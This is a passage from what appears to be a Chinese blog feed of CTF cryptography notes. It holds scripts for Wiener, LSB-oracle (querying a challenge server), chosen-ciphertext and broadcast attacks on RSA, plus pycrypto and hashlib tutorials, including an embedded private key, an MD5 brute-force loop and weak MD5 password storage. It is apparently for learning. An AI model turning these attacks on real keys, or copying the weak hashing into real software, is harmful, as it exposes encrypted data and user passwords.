<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<p>nextrsa-Level2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure>
</li>
<li><p>私钥文件修复:适用情况：提供破损的私钥文件</p>
<p>Jarvis OJ-God Like RSA  []:<a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a></p>
</li>
<li><p>LSB Oracle Attack:适用情况：可以选择密文并泄露最低位</p>
<blockquote>
<p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> ， 因为m的两倍可能大于n，所以经过解密得到的明文是 <code>m&#39;=(2*m)%n</code> 。我们还能够知道 <code>m&#39;</code> 的最低位<code>lsb</code> 是1还是0。 因为n是奇数，而<code>2*m</code> 是偶数，所以如果<code>lsb</code>是0，说明<code>(2*m)%n</code> 是偶数，没有超过n，即<code>m&lt;n/2.0</code> ，反之则<code>m&gt;n/2.0</code> 。举个例子就能明白<code>2%3=2</code> 是偶数，而<code>4%3=1</code> 是奇数。以此类推，构造密文<code>c&quot;=(4^e)*c)%n</code> 使其解密后为<code>m&quot;=(4*m)%n</code> ，判断<code>m&quot;</code> 的奇偶性可以知道<code>m</code> 和 <code>n/4</code> 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间</p>
</blockquote>
</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure>
<p>  Baby RSA</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line">n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span><br><span class="line">c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span><br><span class="line"></span><br><span class="line">λ nc 47.96.239.28 23333</span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come and Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data is even or odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line">1</span><br><span class="line">odd</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>选择密文攻击:适用情况：可以构造任意密文并获得对应明文(在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code> 使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code>)</p>
</li>
<li><p>广播攻击:适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据(使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况)</p>
<p>nextrsa-Level9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><blockquote>
<p>看了各位表哥写的关于RSA的文章，学到了很多，以前之学习了数论，在代码上实践的很少，对这些脚本进行学习，总结，在RSA这一块有了很大的帮助。各位表哥的脚本写的很好，值得学习。</p>
</blockquote>
<p>参考链接：</p>
<p>[]:<a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a></p>
<p>[]:<a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">https://github.com/findneo/RSA-ATTACK</a></p>
<p>[]:<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p>
<p>[]:<a href="https://blog.csdn.net/like98k/article/details/79352076" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79352076</a></p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>python-pycrypto模块浅学</title>
    <url>/2018/08/31/python-pycrypto%E6%A8%A1%E5%9D%97%E6%B5%85%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="python-pycrypto模块学习"><a href="#python-pycrypto模块学习" class="headerlink" title="python-pycrypto模块学习"></a>python-pycrypto模块学习</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; pycrypto模块时python中来处理加密解密等信息安全相关的一个重要模块</span><br><span class="line">&gt; 对称加密方式：</span><br><span class="line">&gt; </span><br><span class="line">&gt; AES</span><br><span class="line">&gt; DES</span><br><span class="line">&gt; ARC4</span><br><span class="line">&gt; 散列值计算：</span><br><span class="line">&gt; </span><br><span class="line">&gt; MD5</span><br><span class="line">&gt; SHA</span><br><span class="line">&gt; HMAC</span><br><span class="line">&gt; 公钥加密和签名：</span><br><span class="line">&gt; </span><br><span class="line">&gt; RSA</span><br><span class="line">&gt; DSA</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="生成公私密钥"><a href="#生成公私密钥" class="headerlink" title="生成公私密钥"></a>生成公私密钥</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪随机数生成器</span></span><br><span class="line">random_generator = Random.new().read</span><br><span class="line"><span class="comment">#rsa算法生成实例</span></span><br><span class="line">rsa = RSA.generate(<span class="number">1024</span>,random_generator)</span><br><span class="line"><span class="comment">#master的密钥对的生成</span></span><br><span class="line">private_pem = rsa.exportKey()</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成公私钥对文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-private.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_pem)</span><br><span class="line"></span><br><span class="line">public_pem = rsa.publickey().exportKey()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-public.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(public_pem)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXamjBCTqlzBxnk0B00G/Ae6hk</span></span><br><span class="line"><span class="string">pKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH43</span></span><br><span class="line"><span class="string">4DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqX</span></span><br><span class="line"><span class="string">DfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICXAIBAAKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyv</span></span><br><span class="line"><span class="string">DdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhW</span></span><br><span class="line"><span class="string">s/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">AoGAeVSc9gUtvE7PvOLqjiEMoJzFxxIZHVZsYaR4VLfj7xFwvxTnVe3yeebPJKeh</span></span><br><span class="line"><span class="string">qVuf2yPI+jsowqOj+ByeRQLtVyjoZH7aW6uZQcKUtMrAMgcZouIKpKVWFhjWguFl</span></span><br><span class="line"><span class="string">CExsfi8EqzxVsBPBkHynqkU69IB4yPB1AMRb4ZcGsYvCgNECQQDpBoiaMD72+YOb</span></span><br><span class="line"><span class="string">bnXKhqW8PxU6/ylZvZL+wFE4Qwcu0nclni/vMMkrxK8oZvAiVOqBjCSXwcA6zZXL</span></span><br><span class="line"><span class="string">MZppBJaZAkEA7Kdo+7fCUyAeivzoYGHKE8Kmr/RTHW7oSgz1bBMdzAugsO8zuNGA</span></span><br><span class="line"><span class="string">fMnLYXTGBJFlfPQuOW3W6Q5UKHppV0uNnwJBAL0kU36ryH/ZGWzxJOUFk8MPhSEE</span></span><br><span class="line"><span class="string">+cBgss7atVIwfcUQiitbkdbZR4CiPfZST3neaRZL9WvElU5ljr+GfKnfUokCQA5L</span></span><br><span class="line"><span class="string">wqzKGgQZgZ7VzlfcMG/nJ1ijws2ZYJDwnXbM5NTpsuhdWtuEVGW1bwLRIhEuk1ns</span></span><br><span class="line"><span class="string">CkrP1ta3VeAoHOr4FnMCQDxnFKPCpjRSEM96xFDNgNh+66wgKg/SXMY5E7e0/LvB</span></span><br><span class="line"><span class="string">oFcJauclu+cP8eaqP0zasVR/xqQT4y091vSZzIADJLA=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
<h3 id="利用python对RSA根据公私钥加解密"><a href="#利用python对RSA根据公私钥加解密" class="headerlink" title="利用python对RSA根据公私钥加解密"></a>利用python对RSA根据公私钥加解密</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#RSA使用公私钥加解密数据：</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_phcs_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">'hello demos this is a plian text!'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-public.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)    <span class="comment">#导入读取到的公钥</span></span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)  <span class="comment">#实例化</span></span><br><span class="line">    cipher_text = base64.b64encode(cipher.encrypt(message))  <span class="comment">#这里需要注意的一点是，py2可以直接将str加密，而py3要转换为bytes</span></span><br><span class="line">    <span class="comment"># cipher_text = base64.b64encode(cipher.encrypt(message).encode(encoding = 'utf-8'))   #语句如下</span></span><br><span class="line">    <span class="keyword">print</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-private.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)</span><br><span class="line">    text = cipher.decrypt(base64.b64decode(cipher_text),<span class="string">"ERROR"</span>)</span><br><span class="line">    <span class="keyword">print</span> text        <span class="comment">#py2这里返回的是str类型的，py3返回的是bytes，需要自己转换</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535692492.84.png" alt></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote>
<p>在python中libnum、gmpy2、pycrypto在密码学中的应用广泛，也特别方便。</p>
</blockquote>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>pycrypto</tag>
      </tags>
  </entry>
  <entry>
    <title>python常用模块—-hashlib</title>
    <url>/2018/08/30/python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E2%80%94-hashlib/</url>
    <content><![CDATA[<h3 id="python常用模块——hashlib"><a href="#python常用模块——hashlib" class="headerlink" title="python常用模块——hashlib"></a>python常用模块——hashlib</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; python的hashlib提供了常见的摘要算法，如MD5,SHA1等</span><br><span class="line">&gt; 摘要算法又称为hash算法、散列算法。它通过一个函数把任意长度的数据转换为一个长度的固定的数据串（通常用十六进制字符串表示）</span><br><span class="line">&gt; 摘要算法反推很困难，因为摘要函数是单向的，对原始数据做一个bit的修改，都会导致计算出的摘要完全不同</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="hashlib模块学习"><a href="#hashlib模块学习" class="headerlink" title="hashlib模块学习"></a>hashlib模块学习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in python hashlib?'</span>)</span><br><span class="line"><span class="comment">#使用生成实例的update方法进行MD5的转换，同时，update会将每次的字符串拼接，如果想要不同的值，每次过后都得实例化</span></span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()   <span class="comment">#返回摘要信息，以十六进制数据返回</span></span><br><span class="line"><span class="keyword">print</span> md5.digest()      <span class="comment">#返回摘要信息，以二进制数据返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#刚才说过的update，如果数据量很大，可以使用它拼接</span></span><br><span class="line"><span class="comment">#MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示</span></span><br><span class="line">md52 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in'</span>)</span><br><span class="line">md5.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示</span></span><br><span class="line"><span class="comment">#有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能，因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞</span></span><br><span class="line">sha1 = hashlib.sha1()</span><br><span class="line">sha1.update(<span class="string">'how to use sha1 in '</span>)</span><br><span class="line">sha1.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> sha1.hexdigest()</span><br></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.进行hash爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line"></span><br><span class="line">a = string.digits + string.lowercase + string.uppercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                s = hashlib.md5(i+j+k+m).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">'9bf514'</span>:</span><br><span class="line">                    <span class="keyword">print</span> i+j+k+m</span><br></pre></td></tr></table></figure>
<p>2.用hashlib模拟用户登录，以及password值加盐存储：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, hashlib</span><br><span class="line">dic = &#123; <span class="string">'syq123'</span>: <span class="string">'506420d6fc050439850f1cb80eb70b9c'</span>,</span><br><span class="line">        <span class="string">'feifei'</span>: <span class="string">'f95f65d787a87a5e3d32c61b3f7e9bec'</span>,</span><br><span class="line">        <span class="string">'zsg123'</span>: <span class="string">'87c34b8d2950946df7a987a990cad99f'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(password)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(password)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Salt_get_md5</span><span class="params">(password,name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_md5(password + name + <span class="string">'salt'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建用户</span></span><br><span class="line">    name = raw_input(<span class="string">'please input your username!!'</span>)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r'^[a-zA-Z].&#123;2,9&#125;'</span>,name):</span><br><span class="line">        userpassword(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'input error!'</span></span><br><span class="line">        username()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">userpassword</span><span class="params">(name)</span>:</span></span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    dic[name] = password    <span class="comment">#这里如果用update方法时会出现一个问题，添加进字典的不是变量对应的值，而是输入的变量名称</span></span><br><span class="line">    <span class="keyword">print</span> dic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">'Please Login'</span></span><br><span class="line">    <span class="keyword">print</span> str.center(<span class="number">25</span>)</span><br><span class="line">    name = raw_input(<span class="string">'please input your 